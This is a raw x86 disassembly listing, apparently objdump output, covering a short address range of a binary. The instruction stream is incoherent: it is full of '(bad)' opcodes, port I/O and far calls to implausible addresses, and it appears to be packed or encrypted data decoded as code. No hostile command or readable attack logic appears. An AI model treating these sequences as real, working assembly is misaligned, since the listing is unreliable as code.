  418dd7:	jge    0x418dae
  418dd9:	loopne 0x418e3c
  418ddb:	arpl   WORD PTR [ebx],cx
  418ddd:	pop    esp
  418dde:	inc    ebp
  418ddf:	cmp    eax,DWORD PTR [ecx*4-0x175f51b7]
  418de6:	sub    DWORD PTR [edx],ebx
  418de8:	rcr    BYTE PTR ss:[eax],0xef
  418dec:	sub    al,0x9c
  418dee:	xor    bl,BYTE PTR [ebx+edi*4-0x48a45cf8]
  418df5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418df6:	call   0x2ee7f4b2
  418dfb:	and    DWORD PTR [ecx],esi
  418dfd:	inc    edi
  418dfe:	add    ch,BYTE PTR [ebx+0x15]
  418e01:	xchg   ebp,eax
  418e02:	inc    ebx
  418e03:	push   es
  418e04:	fstp   TBYTE PTR [esi+edi*2]
  418e07:	adc    al,0xff
  418e0a:	cmp    al,0xbb
  418e0c:	mov    edx,0xa7a989d
  418e11:	ds push 0x65df4aa1
  418e17:	sub    al,BYTE PTR [ecx+0x2e]
  418e1a:	mov    eax,ds:0x19b2337f
  418e1f:	imul   edx,DWORD PTR [ebx+ecx*2],0xa92d8fac
  418e26:	inc    edx
  418e27:	add    al,0x19
  418e29:	pop    edi
  418e2a:	pop    ebp
  418e2b:	fnstsw WORD PTR [edx-0x6fbb95e4]
  418e31:	loope  0x418e66
  418e33:	mov    ds:0xf8f17773,eax
  418e38:	je     0x418e9e
  418e3a:	mov    cl,0x93
  418e3c:	ins    DWORD PTR es:[edi],dx
  418e3d:	inc    ecx
  418e3e:	clc    
  418e3f:	inc    esp
  418e40:	mov    ch,0x6f
  418e42:	out    dx,al
  418e43:	mov    eax,DWORD PTR [eax]
  418e45:	pop    eax
  418e46:	mov    es,WORD PTR [esp+eiz*2-0x9]
  418e4a:	aas    
  418e4b:	pop    eax
  418e4c:	(bad)  
  418e4d:	(bad)  
  418e4f:	jb     0x418e22
  418e51:	iret   
  418e52:	lahf   
  418e53:	mov    eax,ds:0xcfe189ae
  418e58:	popf   
  418e59:	mov    edi,esi
  418e5b:	and    al,0x4e
  418e5d:	aad    0xc6
  418e5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e60:	pop    edi
  418e61:	push   0x5a
  418e63:	mov    esi,ebx
  418e65:	pop    ebp
  418e66:	cwde   
  418e67:	mov    esi,0x5a6d801e
  418e6c:	xchg   DWORD PTR [edi],eax
  418e6e:	(bad)  
  418e6f:	or     ebx,eax
  418e71:	mov    ah,0xd6
  418e73:	outs   dx,BYTE PTR ds:[esi]
  418e74:	std    
  418e75:	xchg   esp,eax
  418e76:	or     ecx,DWORD PTR [ebx-0x42ed71bd]
  418e7c:	jle    0x418e6e
  418e7e:	ret    0xe858
  418e81:	cwde   
  418e82:	sub    al,BYTE PTR [eax+0x561cddba]
  418e88:	mov    al,0x14
  418e8a:	add    DWORD PTR [ebp+0x5a],esp
  418e8d:	pop    ebp
  418e8e:	hlt    
  418e8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e90:	in     eax,dx
  418e91:	add    al,BYTE PTR [eax]
  418e93:	push   edx
  418e94:	mov    eax,ds:0x58bc2796
  418e99:	js     0x418f00
  418e9b:	mov    edx,0xb3c16b98
  418ea0:	(bad)  
  418ea1:	stc    
  418ea2:	in     al,dx
  418ea3:	pusha  
  418ea4:	out    dx,al
  418ea5:	das    
  418ea6:	loope  0x418e38
  418ea8:	pop    edi
  418ea9:	sbb    al,BYTE PTR ds:0x4d79
  418eae:	(bad)  
  418eb0:	test   al,0xd2
  418eb2:	rol    BYTE PTR ds:0xdf414b77,cl
  418eb8:	mov    al,0x29
  418eba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ebb:	push   esp
  418ebc:	test   bl,al
  418ebe:	mov    edx,0x4872aa71
  418ec3:	call   0xd6bd:0xdf1e95e5
  418eca:	mov    eax,0x3daaba35
  418ecf:	in     eax,0xba
  418ed1:	in     al,dx
  418ed2:	sub    eax,0xdc3c86d5
  418ed7:	out    0xb9,eax
  418ed9:	out    0x4d,al
  418edb:	sub    al,0xe0
  418edd:	repnz xchg esp,eax
  418edf:	ds dec edx
  418ee1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ee2:	mov    ebp,0x7175748a
  418ee7:	sub    DWORD PTR ds:0xf379cab3,esp
  418eed:	cli    
  418eee:	xchg   edi,eax
  418eef:	inc    eax
  418ef0:	repz fld TBYTE PTR [eax]
  418ef3:	jne    0x418f4d
  418ef5:	in     eax,0x7c
  418ef7:	(bad)  
  418ef8:	or     al,0xf8
  418efa:	rol    ch,1
  418efc:	and    al,0x9b
  418efe:	xchg   esi,eax
  418eff:	mov    ebp,0x5f523cd8
  418f04:	test   DWORD PTR [esi],edi
  418f06:	test   eax,0x346dfe9b
  418f0b:	out    dx,eax
  418f0c:	stc    
  418f0d:	and    eax,0xf1a105e1
  418f12:	push   es
  418f13:	adc    eax,DWORD PTR [edx+0x34]
  418f16:	push   0xdec1690e
  418f1b:	pop    edx
  418f1c:	mov    bh,0x3a
  418f1e:	inc    ebx
  418f1f:	mov    ecx,0x5cfd7581
  418f24:	out    0x0,al
  418f26:	dec    eax
  418f27:	rcr    DWORD PTR [ebp-0x34de7c5c],0x90
  418f2e:	xor    dl,BYTE PTR cs:[edx+0x7]
  418f32:	pop    ss
  418f33:	jg     0x418eec
  418f35:	dec    eax
  418f36:	sbb    al,BYTE PTR [eax-0x698ec5de]
  418f3c:	stos   BYTE PTR es:[edi],al
  418f3d:	or     ecx,ebx
  418f3f:	inc    edx
  418f40:	fadd   DWORD PTR [ebp-0x3d2eb3e5]
  418f46:	sub    eax,0x368a0118
  418f4b:	call   0x89e1:0x4d83f2cd
  418f52:	mov    esp,0xfdf8fdf1
  418f57:	loope  0x418f83
  418f59:	mul    dh
  418f5b:	lods   eax,DWORD PTR ds:[esi]
  418f5c:	retf   0xce2d
  418f5f:	(bad)  
  418f60:	fidiv  WORD PTR [esi]
  418f62:	les    esi,FWORD PTR ds:[ebp-0x40b3d78c]
  418f69:	(bad)
  418f6e:	ins    BYTE PTR es:[edi],dx
  418f6f:	in     eax,0xa6
  418f71:	or     ch,BYTE PTR [ecx-0x61e6e922]
  418f77:	push   0x393b34c2
  418f7c:	cmp    DWORD PTR [ecx+0x7222e44e],0x5e
  418f83:	mov    ds:0xf7a01631,al
  418f88:	call   0x68737b46
  418f8d:	sub    eax,0x163e80c5
  418f92:	aad    0xbd
  418f94:	ss mov cl,0x60
  418f97:	sbb    eax,0xa56d325b
  418f9c:	out    0x2d,eax
  418f9e:	dec    ebp
  418f9f:	and    BYTE PTR [ebx-0x7657f941],ah
  418fa5:	add    al,0x77
  418fa7:	int    0x54
  418fa9:	hlt    
  418faa:	mov    ah,0x2a
  418fac:	add    bl,BYTE PTR ds:0xcbd4546f
  418fb2:	outs   dx,BYTE PTR ds:[esi]
  418fb3:	scas   eax,DWORD PTR es:[edi]
  418fb4:	aaa    
  418fb5:	shl    dl,1
  418fb7:	fnclex 
  418fb9:	mov    ebx,eax
  418fbb:	idiv   DWORD PTR [ebx+ecx*2+0x12]
  418fbf:	inc    eax
  418fc0:	push   ds
  418fc1:	adc    ecx,edx
  418fc3:	pop    ecx
  418fc4:	icebp  
  418fc5:	xor    al,0xf2
  418fc7:	loopne 0x41900a
  418fc9:	adc    bh,ch
  418fcb:	retf   
  418fcc:	mov    edi,0xad4bbb3b
  418fd1:	inc    ebp
  418fd2:	stc    
  418fd3:	sahf   
  418fd4:	call   0xc13f:0x6aeb59ec
  418fdb:	push   0x35d6b8ed
  418fe0:	xchg   ebx,eax
  418fe1:	mov    cl,BYTE PTR [eax-0x55e52bf3]
  418fe7:	les    eax,FWORD PTR [ebp-0x79]
  418fea:	mov    ds:0x54e06e0d,eax
  418fef:	mov    dl,bh
  418ff1:	shr    BYTE PTR [ecx+0x4877780],cl
  418ff7:	pop    eax
  418ff8:	cmp    DWORD PTR [edi-0x64b00fd8],ebx
  418ffe:	ins    DWORD PTR es:[edi],dx
  418fff:	and    esp,DWORD PTR [edi]
  419001:	stos   BYTE PTR es:[edi],al
  419002:	fidiv  WORD PTR [ebx]
  419004:	jmp    0x4ce0:0xbdcbf939
  41900b:	adc    eax,0xfa7772a5
  419010:	bound  edx,QWORD PTR [edi-0x12dc0463]
  419016:	int    0x68
  419018:	mov    eax,ds:0x4b74d510
  41901d:	fldcw  WORD PTR [edx+esi*8+0x6c]
  419021:	xlat   BYTE PTR es:[ebx]
  419023:	push   ds
  419024:	(bad)  
  419025:	in     eax,dx
  419026:	inc    esi
  419027:	cs dec esi
  419029:	adc    eax,0x3f822881
  41902e:	fsub   st,st(3)
  419030:	retf   
  419031:	pop    esp
  419032:	loope  0x419058
  419034:	mov    esi,0x85a14e
  419039:	inc    edi
  41903a:	repz push 0x10
  41903d:	(bad)  
  41903e:	test   eax,0x7c8716aa
  419043:	and    BYTE PTR [ebx],0x8b
  419046:	push   eax
  419047:	and    esi,ebx
  419049:	sub    BYTE PTR [esi],dh
  41904b:	cmp    BYTE PTR [esi-0x80],al
  41904e:	call   0xf602:0xf2ee9823
  419055:	jbe    0x41906a
  419057:	adc    BYTE PTR [esi],ah
  419059:	mov    ecx,edi
  41905b:	outs   dx,BYTE PTR ds:[esi]
  41905c:	in     al,dx
  41905d:	dec    eax
  41905e:	mov    ah,0x84
  419060:	je     0x41907f
  419062:	das    
  419063:	fbld   TBYTE PTR [esi-0x1e9ff6c1]
  419069:	adc    bh,BYTE PTR [esi]
  41906b:	in     eax,0xb1
  41906d:	outs   dx,BYTE PTR ds:[esi]
  41906e:	or     BYTE PTR [eax+0x50c82e92],al
  419074:	inc    edx
  419075:	sbb    DWORD PTR [ebx-0x28],0x989cf944
  41907c:	and    dl,BYTE PTR [ebp+0x7b]
  41907f:	xchg   esp,eax
  419080:	outs   dx,BYTE PTR ds:[esi]
  419081:	xchg   edx,eax
  419082:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419083:	mov    dh,0x43
  419085:	ret    0x871d
  419088:	cs fst st(1)
  41908b:	and    edx,DWORD PTR [ecx]
  41908d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41908e:	ins    BYTE PTR es:[edi],dx
  41908f:	push   ss
  419090:	jle    0x419048
  419092:	icebp  
  419093:	jl     0x41903e
  419095:	adc    ch,BYTE PTR [eax-0xd48c87f]
  41909b:	inc    esi
  41909c:	(bad)  
  41909d:	fcom   QWORD PTR [edx+eiz*1]
  4190a0:	bound  edx,QWORD PTR [esi]
  4190a2:	fisub  DWORD PTR [ebp+0x7d527917]
  4190a8:	and    eax,0xa5a7f43c
  4190ad:	xor    DWORD PTR [ebx],0xfb5cb9d4
  4190b3:	fs pop es
  4190b5:	adc    DWORD PTR [edi+ecx*1+0xd67d2a0],eax
  4190bc:	sbb    DWORD PTR [ebp+0xe],ecx
  4190bf:	xlat   BYTE PTR ds:[ebx]
  4190c0:	xchg   ebp,eax
  4190c1:	add    cl,ah
  4190c3:	sbb    dl,bh
  4190c5:	hlt    
  4190c6:	loope  0x4190e9
  4190c8:	lods   al,BYTE PTR ds:[esi]
  4190c9:	inc    ecx
  4190ca:	arpl   WORD PTR [esi+0x713a53ff],si
  4190d0:	aam    0x3f
  4190d2:	dec    ebx
  4190d3:	jo     0x419137
  4190d5:	leave  
  4190d6:	mov    ebx,0x8c10b35c
  4190db:	dec    ebx
  4190dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190dd:	stos   DWORD PTR es:[edi],eax
  4190de:	into   
  4190df:	sbb    al,BYTE PTR [esi-0x4518baf0]
  4190e5:	in     al,0xe2
  4190e7:	fisttp WORD PTR [edi-0x923a473]
  4190ed:	fcmovbe st,st(4)
  4190ef:	inc    esp
  4190f0:	inc    ecx
  4190f1:	cmp    bh,BYTE PTR [ebp-0x4c8c9e72]
  4190f7:	inc    ebx
  4190f8:	add    bl,BYTE PTR [edi+0x21]
  4190fb:	fwait
  4190fc:	xchg   edx,eax
  4190fd:	lea    edx,ss:[esi+eax*2+0x37]
  419102:	push   0x5ee244ad
  419107:	add    eax,0x90819815
  41910c:	jo     0x419121
  41910e:	mov    al,0x46
  419110:	inc    esi
  419111:	sbb    DWORD PTR [ecx],edx
  419113:	cmp    eax,0x208bb0d1
  419118:	jns    0x41909a
  41911a:	cmp    eax,0xf8613f59
  41911f:	add    edi,0x30
  419122:	jle    0x4190e9
  419124:	dec    ecx
  419125:	mov    dl,0x74
  419127:	outs   dx,BYTE PTR ds:[esi]
  419128:	fs dec eax
  41912a:	mov    ebp,0xfe974aa0
  41912f:	cmp    al,0x2f
  419131:	jnp    0x41915b
  419133:	mov    al,0x20
  419135:	ins    DWORD PTR es:[edi],dx
  419136:	icebp  
  419137:	jp     0x4190e4
  419139:	cli    
  41913a:	push   ss
  41913b:	jno    0x41919b
  41913d:	fidivr DWORD PTR [ebp+esi*2+0x10c2a539]
  419144:	push   ds
  419145:	sbb    esi,0xffffffd9
  419148:	stc    
  419149:	scas   eax,DWORD PTR es:[edi]
  41914a:	mov    BYTE PTR [esi+ebp*8],cl
  41914d:	mov    ebx,0xe8b02c45
  419152:	xor    ecx,DWORD PTR [eax+0x484d045e]
  419158:	sbb    bh,BYTE PTR [edx]
  41915a:	out    dx,al
  41915b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41915c:	out    dx,eax
  41915d:	xor    BYTE PTR [edi],0xf6
  419160:	mov    edx,0x953b1e9e
  419165:	lods   eax,DWORD PTR cs:[esi]
  419167:	and    esp,DWORD PTR [esi]
  419169:	dec    esi
  41916a:	leave  
  41916b:	call   0xe9b1:0x97b23a02
  419172:	inc    edi
  419173:	dec    BYTE PTR [esi+ebp*4+0xc6262a5]
  41917a:	les    ebp,FWORD PTR [esi]
  41917c:	xor    ecx,eax
  41917e:	test   eax,0x45d642df
  419183:	xchg   esp,eax
  419184:	xchg   bh,bl
  419186:	push   ebp
  419187:	bnd call 0x9b73dae0
  41918d:	sbb    bh,BYTE PTR [edx]
  41918f:	inc    ecx
  419190:	test   eax,0xc58b2993
  419195:	ins    DWORD PTR es:[edi],dx
  419196:	sub    al,0x21
  419198:	fs iret 
  41919a:	stc    
  41919b:	mov    ch,0x1
  41919d:	loopne 0x4191e7
  41919f:	add    al,0xe8
  4191a1:	mov    dl,0xc2
  4191a3:	into   
  4191a4:	jb     0x419174
  4191a6:	rcr    BYTE PTR [edx-0x1c],0x4d
  4191aa:	push   ss
  4191ab:	popf   
  4191ac:	out    dx,eax
  4191ad:	sbb    DWORD PTR [ebp-0x307db7aa],esi
  4191b3:	or     al,0x5d
  4191b5:	daa    
  4191b6:	pop    eax
  4191b7:	push   ecx
  4191b8:	call   0x5c46:0x9441cbbf
  4191bf:	mov    dl,BYTE PTR [edx]
  4191c1:	daa    
  4191c2:	ret    0x5f65
  4191c5:	push   ebp
  4191c6:	adc    edx,DWORD PTR [ecx-0x4e]
  4191c9:	xor    DWORD PTR [edx+0x17],0x60
  4191cd:	jge    0x419238
  4191cf:	lods   al,BYTE PTR ds:[esi]
  4191d0:	sti    
  4191d1:	ins    BYTE PTR es:[edi],dx
  4191d2:	jb     0x419156
  4191d4:	cmp    al,0x33
  4191d6:	ins    BYTE PTR es:[edi],dx
  4191d7:	jae    0x41923c
  4191d9:	fsub   QWORD PTR [ebx+0x1641eb72]
  4191df:	cwde   
  4191e0:	adc    al,0x6f
  4191e2:	nop
  4191e3:	mov    ds:0xfd404109,al
  4191e8:	out    0x80,al
  4191ea:	cmp    ah,BYTE PTR [edx]
  4191ec:	xchg   esi,eax
  4191ed:	or     eax,0x8a4aa2a
  4191f2:	mov    WORD PTR [edx-0x4d],ds
  4191f5:	jl     0x4191f9
  4191f7:	sbb    eax,0xc603d793
  4191fc:	sub    eax,0x1a3bdaea
  419201:	into   
  419202:	int    0x97
  419204:	jne    0x41919d
  419206:	sub    ecx,DWORD PTR [ebx+0x44]
  419209:	push   ss
  41920a:	je     0x419267
  41920c:	dec    ecx
  41920d:	inc    esp
  41920e:	addr16 call 0x4852:0x5a113448
  419216:	push   ebx
  419217:	cwde   
  419218:	clc    
  419219:	inc    ebp
  41921a:	in     eax,dx
  41921b:	nop
  41921c:	nop
  41921d:	aas    
  41921e:	rcl    BYTE PTR [edx],1
  419220:	retf   
  419221:	(bad)  
  419222:	call   0x97eb:0x7ca70007
  419229:	imul   esp,ebx,0x3d
  41922c:	rcr    BYTE PTR [esi-0x7ceaacdb],1
  419232:	dec    ecx
  419233:	pop    esp
  419234:	inc    ebx
  419235:	arpl   WORD PTR [ebp-0x7ea04c26],sp
  41923b:	xchg   ebp,eax
  41923c:	adc    al,0x7a
  41923e:	jecxz  0x419281
  419240:	mov    dh,0xd
  419242:	je     0x419286
  419244:	sbb    al,0xe0
  419246:	push   esi
  419247:	sbb    al,0x2e
  419249:	enter  0xd012,0x4
  41924d:	sbb    ecx,DWORD PTR [ecx-0x4183d7f8]
  419253:	(bad)  
  419254:	mov    al,0x47
  419256:	mov    ds:0x857842a1,al
  41925b:	cmp    edi,DWORD PTR [ebx+0x581a0cd1]
  419261:	inc    BYTE PTR [eax-0x64]
  419264:	xor    DWORD PTR [eax+ebp*4-0x7f3a9d65],edi
  41926b:	mov    al,0x49
  41926d:	adc    BYTE PTR [edi-0x7d],dl
  419270:	sub    ch,BYTE PTR [eax+0x4443dd17]
  419276:	lods   al,BYTE PTR ds:[esi]
  419277:	add    eax,DWORD PTR [edx]
  419279:	sbb    DWORD PTR [edx-0x5b940b96],ecx
  41927f:	test   BYTE PTR [ebp-0x5c],ah
  419282:	adc    DWORD PTR [edi],edx
  419284:	daa    
  419285:	and    DWORD PTR [eax-0x27182d73],eax
  41928b:	sbb    al,0x99
  41928e:	cmp    ch,dl
  419290:	fidivr DWORD PTR [esi]
  419292:	popf   
  419293:	inc    edx
  419294:	in     eax,dx
  419295:	jno    0x419309
  419297:	xchg   edx,eax
  419298:	je     0x41923a
  41929a:	lods   eax,DWORD PTR ds:[esi]
  41929b:	ins    DWORD PTR es:[edi],dx
  41929c:	sbb    al,0x17
  41929e:	mov    ebp,0xac9a1826
  4192a3:	adc    DWORD PTR [edx],edi
  4192a5:	xchg   ecx,eax
  4192a6:	add    cl,0x7
  4192a9:	int    0xfa
  4192ab:	xchg   ebp,eax
  4192ac:	push   cs
  4192ad:	arpl   WORD PTR [esi],sp
  4192af:	pop    eax
  4192b0:	push   eax
  4192b1:	push   cs
  4192b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192b3:	jo     0x4192f5
  4192b5:	mov    edi,edi
  4192b7:	fld    DWORD PTR [esi]
  4192b9:	(bad)  
  4192ba:	retf   
  4192bb:	(bad)  
  4192bc:	out    0x74,eax
  4192be:	xor    eax,DWORD PTR [eax+eiz*8-0x4a86bd2d]
  4192c5:	pop    ss
  4192c6:	inc    edi
  4192c7:	dec    ebp
  4192c8:	clc    
  4192c9:	mov    ebp,0xd95d8ded
  4192ce:	ret    
  4192cf:	push   edi
  4192d0:	and    eax,DWORD PTR [edi]
  4192d2:	xchg   ecx,eax
  4192d3:	pop    eax
  4192d4:	push   cs
  4192d5:	fistp  DWORD PTR [ebp-0x2dd4ae]
  4192db:	sub    bl,bl
  4192dd:	cmp    eax,0x6d778bdc
  4192e2:	sub    BYTE PTR [edi+0x51ba4b8],bl
  4192e8:	mov    al,ds:0x4f9ce042
  4192ed:	rcr    BYTE PTR [edx+0x2789609b],0x54
  4192f4:	jb     0x4192a1
  4192f6:	pop    es
  4192f7:	push   esp
  4192f8:	test   ah,dl
  4192fa:	fld    TBYTE PTR [eax+0x2e12a70c]
  419300:	push   esp
  419301:	cmc    
  419302:	arpl   WORD PTR [edi],bx
  419304:	stos   BYTE PTR es:[edi],al
  419305:	loopne 0x41937b
  419307:	sbb    BYTE PTR [edi-0x1e],bl
  41930a:	xchg   BYTE PTR [ecx-0x699cb2dd],ah
  419310:	stos   DWORD PTR es:[edi],eax
  419311:	out    dx,eax
  419312:	add    edx,DWORD PTR ds:0xc4ee893b
  419318:	or     eax,0x21c20820
  41931d:	adc    DWORD PTR [ecx+0xc],ecx
  419320:	mov    ebx,0x7b433ab9
  419325:	lea    edi,[eax-0x32]
  419328:	ss jnp 0x419380
  41932b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41932c:	and    ch,dl
  41932e:	cmp    ecx,DWORD PTR [ebx+edi*2+0x61741c7c]
  419335:	add    DWORD PTR [edi+0x1fe9b650],esp
  41933b:	xor    BYTE PTR [ebx+0x50],0x82
  41933f:	ret    
  419340:	mov    WORD PTR [ecx+ecx*4+0x6447705b],es
  419347:	icebp  
  419348:	sbb    edx,DWORD PTR [esi]
  41934a:	and    eax,DWORD PTR [edx+eax*8+0x2]
  41934e:	cs ins DWORD PTR es:[edi],dx
  419350:	test   al,0x4d
  419352:	push   cs
  419353:	mov    dh,0xf2
  419355:	sahf   
  419356:	push   ebp
  419357:	dec    edi
  419358:	push   esi
  419359:	and    esi,esp
  41935b:	mov    al,ds:0x1fe72d06
  419360:	cmp    ch,BYTE PTR [esi-0x60e0d164]
  419366:	inc    eax
  419367:	int    0xdf
  419369:	(bad)  
  41936a:	stos   DWORD PTR es:[edi],eax
  41936b:	inc    BYTE PTR [esi+0x53]
  41936e:	addr16 dec ebp
  419370:	clc    
  419371:	daa    
  419372:	mov    dl,BYTE PTR [edx-0x4a]
  419375:	add    al,0x58
  419377:	xor    BYTE PTR [ebp-0x7b],ah
  41937a:	pop    ecx
  41937b:	add    BYTE PTR [edi+0x187fc37f],dl
  419381:	xchg   DWORD PTR [edx-0x3d],ebx
  419384:	mov    cl,0xb0
  419386:	or     ah,BYTE PTR [edx+0x7f77fd6e]
  41938c:	out    0x62,al
  41938e:	data16 scas al,BYTE PTR es:[edi]
  419390:	ds out dx,eax
  419392:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419393:	(bad)  
  419394:	push   edi
  419395:	push   esi
  419396:	xor    al,0x24
  419398:	cs call 0x3177:0x197eb668
  4193a0:	and    eax,0xf4095b81
  4193a5:	scas   eax,DWORD PTR es:[edi]
  4193a6:	jle    0x4193cf
  4193a8:	cmp    al,0x5a
  4193aa:	push   edi
  4193ab:	dec    edx
  4193ac:	mov    eax,0xc8b6079d
  4193b1:	and    bh,BYTE PTR [ecx]
  4193b3:	and    eax,0x4dcc426c
  4193b8:	sbb    dl,BYTE PTR [edi-0x26ffd5a2]
  4193be:	adc    esi,DWORD PTR [edx-0x59]
  4193c1:	je     0x4193e0
  4193c3:	call   0x402ec019
  4193c8:	int3   
  4193c9:	int    0xaa
  4193cb:	and    eax,0xf7ea7a40
  4193d0:	call   0x32e350ec
  4193d5:	mov    al,0xca
  4193d7:	inc    eax
  4193d8:	mov    dh,0xd9
  4193da:	mul    BYTE PTR [eax+0x48]
  4193dd:	outs   dx,DWORD PTR ds:[esi]
  4193de:	cmp    DWORD PTR [ecx+0x5f96bcad],ebp
  4193e4:	jbe    0x4193ca
  4193e6:	stc    
  4193e7:	jo     0x419390
  4193e9:	sahf   
  4193ea:	add    DWORD PTR ds:0xd4960837,esi
  4193f0:	adc    cl,BYTE PTR [esi]
  4193f2:	xchg   ebp,eax
  4193f3:	call   0x3419d963
  4193f8:	in     eax,dx
  4193f9:	pop    edi
  4193fa:	cs jnp 0x41944a
  4193fd:	push   edx
  4193fe:	loope  0x41938e
  419400:	out    0xf6,al
  419402:	mov    ebp,0x77c61bbd
  419407:	push   ds
  419408:	fs dec edi
  41940a:	sub    eax,ecx
  41940c:	sub    dh,BYTE PTR [edi+eiz*2+0x25]
  419410:	xchg   DWORD PTR [ebx],ecx
  419412:	mov    BYTE PTR [ebx+0x1399c0db],dh
  419418:	xchg   edi,eax
  419419:	ret    
  41941a:	jmp    0x419499
  41941c:	or     DWORD PTR [ebx+0x68350d2e],eax
  419422:	mov    DWORD PTR [ecx],esi
  419424:	push   edi
  419425:	test   esp,ecx
  419427:	push   edi
  419428:	jecxz  0x419446
  41942a:	sti    
  41942b:	sahf   
  41942c:	sti    
  41942d:	or     bh,BYTE PTR ss:[ecx]
  419430:	jo     0x419498
  419432:	pop    ebx
  419433:	inc    eax
  419434:	or     eax,ebp
  419436:	xor    edx,esp
  419438:	and    BYTE PTR [esi+0x4b7a1fa],bh
  41943e:	adc    BYTE PTR [ecx+ebx*4],0x51
  419442:	lock jo 0x4193db
  419445:	and    BYTE PTR [ebp+eax*4+0x28d27f4f],bh
  41944c:	jnp    0x41949c
  41944e:	add    DWORD PTR [eax],ebx
  419450:	sbb    al,0xa7
  419452:	out    dx,eax
  419453:	adc    esp,DWORD PTR [ecx]
  419455:	jmp    0x419461
  419457:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419458:	test   DWORD PTR [edi-0x3ce5ba4b],0x8bb5007e
  419462:	imul   eax,DWORD PTR [ebp-0x6],0xc080a286
  419469:	(bad)  
  41946a:	in     eax,dx
  41946b:	mov    edi,0x55f62c80
  419470:	add    ah,0x56
  419473:	(bad)  
  419475:	and    ebp,DWORD PTR [ebx+edi*1-0x47]
  419479:	fbstp  TBYTE PTR [ebx]
  41947b:	jecxz  0x4194ec
  41947d:	xor    edx,DWORD PTR [ebx+0x1b]
  419480:	or     ebx,eax
  419482:	rol    BYTE PTR [edx+0x56],0x5a
  419486:	xchg   ebx,eax
  419487:	add    bl,BYTE PTR [edx-0x463e88]
  41948d:	push   ss
  41948e:	mov    eax,0xde0af56a
  419493:	mov    dh,0xac
  419495:	mov    ebp,0xb4b7231b
  41949a:	pop    esp
  41949b:	test   BYTE PTR [ecx-0x4d],ch
  41949e:	pop    esp
  41949f:	inc    esp
  4194a0:	clc    
  4194a1:	jb     0x419501
  4194a3:	xor    BYTE PTR ds:0x770eab9,0x73
  4194aa:	mov    ecx,0x7eeb1ea
  4194af:	adc    eax,0x84d18b56
  4194b4:	dec    ecx
  4194b5:	imul   edx,DWORD PTR [edi],0x3f
  4194b8:	scas   al,BYTE PTR es:[edi]
  4194b9:	call   0xaf042f23
  4194be:	idiv   ch
  4194c0:	fld    TBYTE PTR [ecx+0x2f]
  4194c3:	xor    dl,BYTE PTR [eax]
  4194c5:	jne    0x419511
  4194c7:	inc    ebx
  4194c8:	or     DWORD PTR [edx+ecx*2-0x12],eax
  4194cc:	jmp    0x41950e
  4194ce:	and    esi,ecx
  4194d0:	push   ebx
  4194d1:	out    0xea,al
  4194d3:	mov    cl,0x9d
  4194d5:	stc    
  4194d6:	dec    eax
  4194d7:	mov    bl,0x60
  4194d9:	sbb    ebp,DWORD PTR [eax]
  4194db:	stc    
  4194dc:	push   0xfffffffd
  4194de:	push   ecx
  4194df:	xlat   BYTE PTR es:[ebx]
  4194e1:	mov    edx,0xf091e3be
  4194e6:	in     eax,dx
  4194e7:	ds mov bh,0xf4
  4194ea:	in     eax,0xf0
  4194ec:	mov    bl,0x37
  4194ee:	je     0x41954e
  4194f0:	dec    edi
  4194f1:	and    esi,esi
  4194f3:	das    
  4194f4:	ins    DWORD PTR es:[edi],dx
  4194f5:	cwde   
  4194f6:	sub    eax,0xb417a33f
  4194fb:	push   edi
  4194fc:	dec    edx
  4194fd:	cmp    DWORD PTR [eax+0x3e3142e9],edi
  419503:	sti    
  419504:	jmp    0xaa95d814
  419509:	mov    dh,0xb5
  41950b:	pusha  
  41950c:	push   ebp
  41950d:	xor    eax,0xef7d1bea
  419512:	icebp  
  419513:	cwde   
  419514:	push   ebp
  419515:	adc    BYTE PTR [eax],bl
  419517:	ficom  WORD PTR [ebx+0x7c093940]
  41951d:	fcmovne st,st(4)
  41951f:	jnp    0x419520
  419521:	inc    ebx
  419522:	sbb    bl,BYTE PTR [eax]
  419524:	pop    ebp
  419525:	fidivr WORD PTR [edx]
  419527:	daa    
  419528:	pop    ebx
  419529:	mov    BYTE PTR [edi-0x48],bh
  41952c:	and    al,0xdf
  41952e:	sub    eax,0xa6fe8e8f
  419533:	pop    ebx
  419534:	outs   dx,BYTE PTR ds:[esi]
  419535:	popf   
  419536:	mov    cl,0xad
  419538:	fsub   QWORD PTR [esi]
  41953a:	dec    ecx
  41953b:	xchg   ch,bl
  41953d:	mov    ecx,0xaace6675
  419542:	dec    ecx
  419543:	fcmovnu st,st(5)
  419545:	loop   0x419587
  419547:	cmp    BYTE PTR [ecx+0x251cefbc],ch
  41954d:	jae    0x4194d4
  41954f:	sub    ebp,DWORD PTR [edx]
  419551:	and    eax,0x6094c3e9
  419556:	push   ebx
  419557:	adc    dl,cl
  419559:	push   edx
  41955a:	fld    DWORD PTR [esp+esi*1+0x10]
  41955e:	lock js 0x419589
  419561:	sahf   
  419562:	sbb    BYTE PTR [ecx+0x5c9f6d4e],ch
  419568:	loope  0x4195c7
  41956a:	xchg   edi,eax
  41956b:	or     BYTE PTR [eax-0x5990dfd3],al
  419571:	mov    eax,ds:0xc4763b0e
  419576:	push   esp
  419577:	jl     0x4195ba
  419579:	dec    ebp
  41957a:	mov    esp,edi
  41957c:	mov    ds:0x2f9244fb,eax
  419581:	xlat   BYTE PTR ds:[ebx]
  419582:	ffreep st(1)
  419584:	inc    BYTE PTR [edx]
  419586:	xor    DWORD PTR [edx+0x20e41fbe],eax
  41958c:	xor    dl,al
  41958e:	push   eax
  41958f:	dec    ecx
  419590:	lea    edi,ds:0x2b57a388
  419596:	push   ebp
  419597:	or     al,BYTE PTR [edx-0x4a7d4cc5]
  41959d:	jno    0x41956d
  41959f:	xor    ecx,ebp
  4195a1:	mul    DWORD PTR [ecx+ecx*8+0x55babafc]
  4195a8:	mov    ah,0x43
  4195aa:	push   esi
  4195ab:	adc    eax,0x1bd6799c
